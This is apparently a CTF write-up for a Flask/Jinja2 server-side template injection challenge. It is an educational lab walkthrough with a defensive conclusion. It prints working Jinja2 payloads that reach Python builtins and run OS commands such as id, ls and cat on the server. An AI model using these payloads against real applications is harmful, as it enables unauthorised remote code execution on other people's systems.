![](https://miro.medium.com/v2/resize:fit:700/1*eUUkHTLoXS0Wb-DBc32WmA.png)

## Challenge Description

I made a cool website where you can announce whatever you want! Try it out!

## Initial Analysis

When opening the target website, the first thing I noticed was a simple input form allowing users to submit text for an announcement. Based on the challenge name **SSTI1**, it was immediately clear that the objective involves **Server-Side Template Injection (SSTI)**.

To understand the underlying technology, I checked the site using the **Wappalyzer** extension, which revealed that the backend tech stack was running on **Python Flask**.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*4HF-bP--_zVZOsY1-nGl6w.png)

## Identification & Vulnerability Testing

Since Flask typically uses the **Jinja2** templating engine, I needed to confirm if the input field was rendering templates dynamically without proper sanitization.

I tested this by submitting a simple mathematical expression as a payload:

```
{{ 7*7 }}
```

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*XEeKEOyXucpYmjK6uO0F8Q.png)

After submitting, the application evaluated the expression and displayed the output as `49`. This confirmed that the application was indeed vulnerable to Server-Side Template Injection.

## Exploitation Flow

## 1\. Researching Payloads

To weaponize this vulnerability and achieve Remote Code Execution (RCE), I looked up standard Flask/Jinja2 SSTI bypasses. I referenced a comprehensive payload guide from a Coventry University GitHub page `https://github.coventry.ac.uk/pages/aa9863/5067CEM/9_SSTI/ExploitSSTI/` and identified two common approaches:

- `{{ request.application.__globals__.__builtins__ }}` (Used to access built-in functions)
- `{{ __import__('os').popen('id').read() }}` (Direct OS command execution)

## 2\. Crafting the Exploit

I started by testing the first payload. It successfully executed, dumping a massive list of Python built-in functions onto the screen. However, when I tried the second payload directly, the application threw an **Internal Server Error (500)**.

To bypass this restriction, I merged both concepts. By leveraging the `request.application` object to access global builtins, I chained the `__import__` function to execute system commands.

Here is the combined payload I used to check my current user ID:

```
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*cy6Jj6vYOJ_quJu-k8gclw.png)

The payload executed successfully, returning the output of the `id` command!

## 3\. Listing Directory Files

Now that I had reliable Remote Code Execution, the next step was to explore the directory structure. I swapped out the `id` command with `ls` to list the files in the current working directory:

```
{{ request.application.__globals__.__builtins__.__import__('os').popen('ls').read() }}
```

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*vvZHj818HyRLrIIK1tORig.png)

The output revealed a file named `flag`.

## 4\. Reading the Flag

Finally, I changed the command from `ls` to `cat flag` to print the contents of the flag file:

```
{{ request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}
```

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*jYAAJzpxQEOLmy1ficp2XQ.png)

Boom! The flag was printed successfully on the page.

## Conclusion

This challenge is a classic example of why you should never trust user input inside template engines. When using frameworks like Flask with Jinja2, always ensure that user inputs are passed as template _arguments_ rather than being concatenated directly into the template string.

Thanks for reading! If you have any questions or alternative ways to solve this, feel free to drop them in the comments below.
